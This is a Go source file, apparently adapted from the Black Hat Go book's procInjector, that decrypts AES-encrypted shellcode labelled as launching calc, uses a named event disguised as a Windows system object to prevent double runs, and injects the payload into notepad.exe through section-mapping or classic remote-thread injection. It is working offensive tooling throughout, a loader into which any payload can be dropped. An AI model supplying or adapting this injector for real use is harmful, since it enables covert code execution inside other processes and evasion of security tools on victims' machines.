package main

//https://github.com/blackhat-go/bhg/tree/master/ch-12/procInjector

import (
	"encoding/hex"
	"fmt"
	"log"
	"syscall"

	"golang.org/x/sys/windows"
)

var (
	kernel32DLL = syscall.NewLazyDLL("Kernel32.dll")
	ntdllDLL    = syscall.NewLazyDLL("ntdll.dll")
	//advapi32DLL = syscall.NewLazyDLL("Advapi32.dll")

	procCloseHandle          = kernel32DLL.NewProc("CloseHandle")
	procCreateRemoteThreadEx = kernel32DLL.NewProc("CreateRemoteThreadEx")
	procGetExitCodeThread    = kernel32DLL.NewProc("GetExitCodeThread")
	procOpenProcess          = kernel32DLL.NewProc("OpenProcess")
	procVirtualAllocEx       = kernel32DLL.NewProc("VirtualAllocEx")
	procVirtualFreeEx        = kernel32DLL.NewProc("VirtualFreeEx")
	procVirtualProtectEx     = kernel32DLL.NewProc("VirtualProtectEx")
	procWaitForSingleObject  = kernel32DLL.NewProc("WaitForSingleObject")
	procWriteProcessMemory   = kernel32DLL.NewProc("WriteProcessMemory")
	procGetProcAddress       = kernel32DLL.NewProc("GetProcAddress")
	procNtCreateSection      = ntdllDLL.NewProc("NtCreateSection")
	procNtMapViewOfSection   = ntdllDLL.NewProc("NtMapViewOfSection")
	procRtlCreateUserThread  = ntdllDLL.NewProc("RtlCreateUserThread")
)

func IsPayloadRunning() bool {
	running := false
	sa := &windows.SecurityAttributes{}
	eventName := windows.StringToUTF16Ptr("WinSta0_WorkFoldersShellRequeryEvent") //SysInternals WinObj > Sessions/1/BaseNamedObjects for Event Names

	hEvt, err := windows.CreateEvent(sa, 1, 1, eventName)
	if err != nil {
		fmt.Printf("CreateEvent error: %s\n", err)
		windows.CloseHandle(hEvt)
		running = true
	}
	return running
}

func main() {

	var inj Inject
	inj.ProcessName = "notepad.exe"

	//msgbox
	// encshellcode, errSC := hex.DecodeString("1c669edfa124b38a80cb668536d05e2f790c3354ca069a37876918e57e546b556ada218ab2ed09ce7449cf3f25c16c1accddecb1801662823ae6e66a7aed2777a9ed2c30511b1cfe2e84900f772ce220888acadba7bc487badce996565122d35d62246564ff64aafab4d6e237dbbe49e0b890cd38144a2aca2e42d98c8f8d3230ef64bd092c7fe2bb437dc844a2bdc0c58812c11a2fc34c2d2c5b6dec7cd8b650969d5564fdf11718a27bcfea7de1cc6e90d99ab15ab91e33f5ed35cd19087662e1addd4ae159fc008afe014e92ef812f58c895fa8d1c1588dd4c7cab665848f52ed769fea4cbd16dbb80a6ad1d4df0c1ab7917d118f35c2d125c9b4b33aa827c32931524184cf724ac164b666a7c5dc4bb297b58cf0cce0bdc2b9eba3f2fd9504cbddd35da07f054867d17fe33e46d38c442b4109aa760eeb08e84f9a5da50fb5635128bb4d95ea9f6552757a000ee985f5cb61d71e3f690eb4dc6224c8")
	// if errSC != nil {
	// 	log.Fatal(fmt.Sprintf("Error decoding hex string: %s\n", errSC.Error()))
	// }
	// salt := "41bbdfd8ce334941304b78c85c89304b45d6afd8c58d53eb948cf96d924277e8" // Argon (hex)
	// key := "063314ece0c568eaec9f7bacb7044b46"                                  // AES256 key (32-bytes) derived from password (hex): 4752c03db0e275f31dee97d99b1b245ed1dee03b374a55ad0bc20ce810b654a9
	// inputNonce := "53f5d245371ea7a57b3d9da5"                                   // AES256 nonce (hex)

	//calc
	encshellcode, errSC := hex.DecodeString("7e861d790ce210ddecbb07d3517bb9079888077e20deb4879298eea0e7140095a41028305b0e4360b5a4046ccf568b476bb0e7b0eee78b967e2ffb7136c7671d190df27ce009d4e59583586529ed08e864769fac964a880134374ad43a1f8735318e47ce332ffafebc3f4100a04365eb8d19d5839d74daabd555d7eeabd7cfdca38c4ad627b7903116a20a86a347ca7f7876984c22ad792b828911838987b527c5d4538cdf0b8914820ddc4cd72b8e8dbba6e8b1e95baeab0bcb05a501ec01a516b936d3a449c3cf10f96c1b31bddd483f92d1ff25a7df8b84c9d5d673ca7369b46bced226517e453395ffef5c4fc80150c0eda5a98937d68bef6271190831758a1734f24414acda97c3c5bce3c6ff79a97e330470fc3fb01dc558d9dbb46aacba29d9a1")
	if errSC != nil {
		log.Fatal(fmt.Sprintf("Error decoding hex string: %s\n", errSC.Error()))
	}
	salt := "6e8c6036ac60b36c6394f760768c9f22d47bde7a2c1fea710080ac9da97a6e68" // Argon (hex)
	key := "d36b2bfec5f88d3e143e32c59a54c77e"                                  // AES256 key (32-bytes) derived from password (hex): 82617258092d31c581cefd46b1e6bba6c85fbe1d10066e289b5d47ed30f48a85
	inputNonce := "8a58bf23f08977d5146006bb"                                   // AES256 nonce (hex)

	shellcode := decryptAES("AES256", salt, key, inputNonce, encshellcode)
	// //fmt.Printf("%v\n", hex.Dump(shellcode))

	inj.ShellCode = shellcode
	inj.ShellCodeSize = uint32(len(shellcode))

	// Check for other instances
	running := IsPayloadRunning()
	if running {
		log.Fatal(fmt.Printf("Already running, goodbye...\n"))
	}

	// Get target PID for injection
	err := FindTarget(&inj)
	if err != nil {
		log.Fatal(fmt.Println("Could not find pid of notepad.exe"))
	}
	fmt.Printf("Found PID of notepad.exe: %v\n", inj.Pid)

	//ClassicInjection(inj)
	MapViewOfSectionInjection(inj)
}

func MapViewOfSectionInjection(inj Inject) {
	// Open process
	err := OpenProcessHandle(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error OpenProcessHandle: %s\n", err))
	}

	//inject view
	//create memory section
	err = NtCreateSection(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error NtCreateSection: %s\n", err))
	}

	//create local section view
	err = NtMapViewOfSectionLocal(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error NtMapViewOfSectionLocal: %s\n", err))
	}

	//copy payload into section
	err = WriteProcessMemoryLocal(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error WriteProcessMemory: %s\n", err))
	}

	//create remote section view in target process
	err = NtMapViewOfSectionRemote(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error NtMapViewOfSectionRemote: %s\n", err))
	}

	//execute thread
	err = RtlCreateUserThread(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error RtlCreateUserThread: %s\n", err))
	}

	// wait and close handles
	err = WaitForSingleObject(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error WaitForSingleObject: %s\n", err))
	}

}

func ClassicInjection(inj Inject) {
	// Open process
	err := OpenProcessHandle(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error OpenProcessHandle: %s\n", err))
	}

	// Allocate memory
	err = VirtualAllocEx(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error VirtualAllocEx: %s\n", err))
	}

	// Write it
	err = WriteProcessMemoryRemote(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error WriteProcessMemory: %s\n", err))
	}

	// populate loadlibrarya address
	err = GetLoadLibAddress(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error GetLoadLibAddress: %s\n", err))
	}

	// change permissions to RX
	err = VirtualProtectEx(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error VirtualProtectEx: %s\n", err))
	}

	// Execute
	//fmt.Printf("%+v\n", inj)
	err = CreateRemoteThreadEx(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error CreateRemoteThread: %s\n", err))
	}

	err = WaitForSingleObject(&inj)
	if err != nil {
		log.Fatal(fmt.Printf("      Error WaitForSingleObject: %s\n", err))
	}
}
